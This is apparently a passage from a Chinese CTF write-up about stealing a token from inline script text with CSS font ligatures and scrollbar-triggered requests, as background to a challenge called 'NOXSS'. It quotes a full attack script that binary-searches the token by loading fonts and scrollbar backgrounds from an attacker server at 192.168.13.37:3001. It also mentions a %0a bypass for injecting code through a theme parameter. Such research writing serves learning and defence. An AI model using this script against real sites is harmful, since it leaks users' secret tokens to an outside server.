data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191120013522.png" alt=""></p><p>这也是原作者在原文提到的先发送一个请求让 chrome 缓存好字体的原因，但是这个方法及其不稳定…用原作者的代码直接跑跑的结果也是五花八门，每次跑都不一样。</p><p>然后比较稳定的办法是，预测 script 标签内的长度，比如这里的 463px ，我们设置一个比它大的值，这样一开始的渲染就不会影响到我们的结果了，对应的连字 horiz-adv-x 我们也将其扩大到 500000 ，这样就能保证每次都可以以正确的结果造成宽度溢出然后触发我们的请求了。</p><p>But，这个办法需要知道大概 script 标签内大概的宽度，万一不知道呢？</p><p>我们可以参考 ROIS 的做法，使用 iframe 的 onload 事件，当 iframe 加载完成之后再将 iframe 宽度缩小，这样就能稳定触发了。也就是说 font.html 中 iframe 我们可以这么写：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/test.html"</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">"0"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width:10000px"</span>  <span class="hljs-attr">onload</span>=<span class="hljs-string">"event.target.style.width='100px'"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>一开始设置一个特别大的宽度，保证不会因为渲染顺序的原因触发我们构造的请求，待到 iframe 内字体加载完毕，再将其宽度缩小，触发我们构造的请求。</p><p>以下是原作者使用二分加快爆破、提前缓存避免缓存问题构造的 index.html 代码：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">utf-8</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">cookie.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">big</span> <span class="hljs-attr">id</span>=<span class="hljs-string">token</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">big</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">    (<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">const</span> EXPECTED_TOKEN_LENGTH = <span class="hljs-number">32</span>;</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">const</span> ALPHABET = <span class="hljs-string">'0123456789abcdef'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// W poniższym elemencie będziemy wypisywać przeczytany token.</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">const</span> outputElement = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'token'</span>);</span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// W tej zmiennej przechowamy token, który udało się już</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// wydobyć</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">let</span> extractedToken = <span class="hljs-string">''</span>;</span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// W tej zmiennej przechowamy prefix do tworzenia ligatur</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">let</span> prefix = <span class="hljs-string">'"'</span>;</span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Wysokopoziomowo: po prostu wyciągamy kolejny znak tokena</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// dopóki nie wyciągnęliśmy wszystkich znaków :) </span></span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">while</span> (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) {</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> nextTokenChar = <span class="hljs-keyword">await</span> getNextTokenCharacter();</span></span><br><span class="line">            extractedToken += nextTokenChar;</span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Znak, który wyciągnęliśmy musi być też dodany do przedrostka</span></span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// dla następnych ligatur.</span></span></span><br><span class="line">            prefix += nextTokenChar;</span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Wypiszmy w HTML-u jaki token jak na razie wyciągnęliśmy.</span></span></span><br><span class="line">            outputElement.textContent = extractedToken;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Jak dotarliśmy tutaj, to znaczy, że mamy cały token!</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// W ramach świętowania usuńmy wszystkie iframe'y i ustawmy</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// pogrubienie na tokenie widocznym w HTML-u ;-)</span></span></span><br><span class="line">        deleteAllIframes();</span><br><span class="line"><span class="hljs-actionscript">        outputElement.style.fontWeight = <span class="hljs-string">'bold'</span>;</span></span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Funkcja, której celem jest wydobycie następnego znaku tokena</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// metodą dziel i zwyciężaj.</span></span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNextTokenCharacter</span>(<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Dla celów wydajnościowych - usuńmy wszystkie istniejące elementy iframe.</span></span></span><br><span class="line">            deleteAllIframes();</span><br><span class="line"></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">let</span> alphabet = ALPHABET;</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Wykonujemy operacje tak długo aż wydobędziemy informację</span></span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// jaki jest następny znak tokena.</span></span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">while</span> (alphabet.length &gt; <span class="hljs-number">1</span>) {</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Będziemy oczekiwać na utworzenie nowego ciasteczka - najpierw więc</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// usuńmy wszystkie istniejące.</span></span></span><br><span class="line">                clearAllCookies();</span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">const</span> [leftChars, rightChars] = split(alphabet);</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Najpierw upewniamy się, że fonty dla obu zestawów ligatur</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// są w cache'u.</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">await</span> makeSureFontsAreCached(leftChars, rightChars);</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Niestety - praktyczne testy pokazały, że wrzucenie w to miejsce</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// sztucznego opóźnienia znacząco zwiększa prawdopodobieństwo, że atak</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// po drodze się nie "wysypie"...</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">await</span> delay(<span class="hljs-number">100</span>);</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// A potem tworzymy dwa iframe'y z "atakującym" CSS-em</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">await</span> <span class="hljs-built_in">Promise</span>.all([createAttackIframe(leftChars), createAttackIframe(rightChars)]);</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Czekamy na znaki z połączenia zwrotnego...</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">const</span> chars = <span class="hljs-keyword">await</span> getCharsFromReverseConnection();</span></span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// ... i na ich podstawie kontynuujemy "dziel i zwyciężaj".</span></span></span><br><span class="line">                alphabet = chars;</span><br><span class="line">            }</span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// Jeśli znaleźliśmy się w tym miejscu, to znaczy, że alphabet</span></span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-comment">// ma jeden znak. Wniosek: ten jeden znak to kolejny znak tokena.</span></span></span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">return</span> alphabet;</span></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clearAllCookies</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-built_in">Object</span>.keys(Cookies.get()).forEach(<span class="hljs-function"><span class="hljs-params">cookie</span> =&gt;</span> {</span></span><br><span class="line">                Cookies.remove(cookie);</span><br><span class="line">            });</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deleteAllIframes</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-built_in">document</span>.querySelectorAll(<span class="hljs-string">'iframe'</span>).forEach(<span class="hljs-function"><span class="hljs-params">iframe</span> =&gt;</span> {</span></span><br><span class="line">                iframe.parentNode.removeChild(iframe);</span><br><span class="line">            });</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Funkcja dzieląca string na dwa stringi o tej</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// samej długości (lub różnej o jeden).</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Np. split("abcd") == ["ab", "cd"];</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">split</span><span class="hljs-params">(s)</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">const</span> halfLength = <span class="hljs-built_in">parseInt</span>(s.length / <span class="hljs-number">2</span>);</span></span><br><span class="line"><span class="hljs-actionscript">            <span class="hljs-keyword">return</span> [s.substring(<span class="hljs-number">0</span>, halfLength), s.substring(halfLength)];</span></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Funkcja generująca losowego stringa, np.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// randomValue() == "rand6226966173982633"</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">randomValue</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-string">"rand"</span> + <span class="hljs-built_in">Math</span>.random().toString().slice(<span class="hljs-number">2</span>);</span></span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Generujemy CSS-a, który zapewni nam, że fonty znajdą się w cache.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Jako dowód na to, że font został już pobrany, użyjemy sprawdzenia</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// czy ciasteczko font_${losowy_ciąg_znaków} zostało zdefiniowane.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeSureFontsAreCached</span><span class="hljs-params">(leftChars, rightChars)</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u.</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> encodedPrefix;</span></span><br><span class="line"><span class="hljs-javascript">                [encodedPrefix, leftChars, rightChars] = [prefix, leftChars, rightChars].map(<span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> <span class="hljs-built_in">encodeURIComponent</span>(val));</span></span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Generujemy CSS-a odwołującego się do obu fontów. Używamy body:before i body:after</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// by upewnić się, że przeglądarka będzie musiała oba fonty pobrać.</span></span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">const</span> css = `</span></span><br><span class="line">                    @font-face {</span><br><span class="line"><span class="hljs-actionscript">                        font-family: <span class="hljs-string">'hack1'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                        src: url(http:<span class="hljs-comment">//192.168.13.37:3001/font/${encodedPrefix}/${leftChars})</span></span></span><br><span class="line">                    }</span><br><span class="line">                    @font-face {</span><br><span class="line"><span class="hljs-actionscript">                        font-family: <span class="hljs-string">'hack2'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                        src: url(http:<span class="hljs-comment">//192.168.13.37:3001/font/${encodedPrefix}/${rightChars})</span></span></span><br><span class="line">                    }</span><br><span class="line">                    body:before {</span><br><span class="line"><span class="hljs-actionscript">                        content: <span class="hljs-string">'x'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                        font-family: <span class="hljs-string">'hack1'</span>;</span></span><br><span class="line">                    }</span><br><span class="line">                    body:after {</span><br><span class="line"><span class="hljs-actionscript">                        content: <span class="hljs-string">'x'</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                        font-family: <span class="hljs-string">'hack2'</span>;</span></span><br><span class="line">                    }</span><br><span class="line">                `;</span><br><span class="line">                </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Tworzymy iframe, w którym załadowane zostaną fonty</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">                iframe.onload = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                    <span class="hljs-comment">// Funkcja zakończy swoje działanie dopiero gdy zostanie wyzwolone zdarzenie</span></span></span><br><span class="line"><span class="hljs-actionscript">                    <span class="hljs-comment">// onload w elemencie iframe</span></span></span><br><span class="line">                    resolve();</span><br><span class="line">                }</span><br><span class="line"><span class="hljs-javascript">                iframe.src = <span class="hljs-string">'http://localhost:12345/?css='</span> + <span class="hljs-built_in">encodeURIComponent</span>(css);</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">            })</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Jak wywołana zostaje ta funkcja, to już mamy pewność, że fonty</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// są w cache'u. Spróbujmy więc zaatakować z takim stylem, w wyniku</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// którego pojawi się pasek przewijania, jeśli trafiliśmy ze znakami</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// w tokenie.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createAttackIframe</span><span class="hljs-params">(chars)</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u.</span></span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">let</span> encodedPrefix;</span></span><br><span class="line"><span class="hljs-javascript">                [encodedPrefix, chars] = [prefix, chars].map(<span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> <span class="hljs-built_in">encodeURIComponent</span>(val));</span></span><br><span class="line">            </span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-keyword">const</span> css = `</span></span><br><span class="line">                @font-face {</span><br><span class="line"><span class="hljs-actionscript">                    font-family: <span class="hljs-string">"hack"</span>;</span></span><br><span class="line"><span class="hljs-actionscript">                    src: url(http:<span class="hljs-comment">//192.168.13.37:3001/font/${encodedPrefix}/${chars})</span></span></span><br><span class="line">                }</span><br><span class="line">                script {</span><br><span class="line">                    display: table;</span><br><span class="line"><span class="hljs-actionscript">                    font-family: <span class="hljs-string">"hack"</span>;</span></span><br><span class="line">                    white-space: nowrap;</span><br><span class="line">                }</span><br><span class="line">                body::-webkit-scrollbar {</span><br><span class="line">                    background: blue;</span><br><span class="line">                }</span><br><span class="line">                body::-webkit-scrollbar:horizontal {</span><br><span class="line"><span class="hljs-actionscript">                    background: blue url(http:<span class="hljs-comment">//192.168.13.37:3001/reverse/${chars});</span></span></span><br><span class="line">                }</span><br><span class="line">                `;</span><br><span class="line">            </span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">const</span> iframe = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'iframe'</span>);</span></span><br><span class="line"><span class="hljs-javascript">                iframe.onload = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span></span><br><span class="line">                    resolve();</span><br><span class="line">                }</span><br><span class="line"><span class="hljs-javascript">                iframe.src = <span class="hljs-string">'http://localhost:12345/?css='</span> + <span class="hljs-built_in">encodeURIComponent</span>(css);</span></span><br><span class="line"><span class="hljs-actionscript">                <span class="hljs-comment">// Ten iframe musi być stosunkowo wąski - by pojawił się pasek przewijania.</span></span></span><br><span class="line"><span class="hljs-actionscript">                iframe.style.width = <span class="hljs-string">"40px"</span>;</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line">            })   </span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// Sprawdzamy co 20ms czy dostaliśmy połączenie zwrotne wygenerowane</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-comment">// przez pasek przewijania. Jeśli tak - to zwracamy wartość z ciasteczka chars.</span></span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCharsFromReverseConnection</span><span class="hljs-params">()</span> </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">                <span class="hljs-keyword">const</span> interval = setInterval(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-actionscript">                    <span class="hljs-keyword">const</span> chars = Cookies.get(<span class="hljs-string">'chars'</span>);</span></span><br><span class="line">                    if (chars) {</span><br><span class="line">                        clearInterval(interval);</span><br><span class="line">                        resolve(chars);</span><br><span class="line">                    }</span><br><span class="line">                }, 20);</span><br><span class="line">            })</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delay</span>(<span class="hljs-params">time</span>) </span>{</span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {</span></span><br><span class="line">                setTimeout(resolve, time);</span><br><span class="line">            })</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    })();</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>但是我没成功过2333…</p><h1 id="NOXSS"><a href="#NOXSS" class="headerlink" title="NOXSS"></a>NOXSS</h1><p>终于可以回到我们的题目了，其实走完以上流程，这个题目已经迎刃而解了，出题人出的点也正是 token2 的点。</p><p>随便注册一个账号之后，我们可以在 theme 参数发现有代码注入的地方，但是过滤了尖括号，我们可以用<code>%0a</code>进行换行</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD